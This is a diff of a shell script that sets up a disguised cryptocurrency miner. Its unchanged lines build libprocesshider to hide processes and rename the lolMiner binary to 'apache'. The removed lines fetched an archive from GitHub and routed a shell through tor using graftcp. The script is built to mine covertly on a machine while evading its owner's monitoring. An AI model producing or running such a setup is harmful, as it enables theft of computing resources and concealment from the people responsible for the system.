@@ -4,23 +4,6 @@ dpkg-reconfigure --frontend noninteractive tzdata
 apt update
 apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
 service tor start
-wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 127.0.0.1:9050
-socks5_username = 
-socks5_password = 
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
 
 git clone https://github.com/hanifgz/libprocesshider.git
 cd libprocesshider;make
@@ -34,4 +17,4 @@ cd 1.44
 mv lolMiner ../apache
 cd ..
 
-screen ./graftcp/graftcp bash
+screen -R
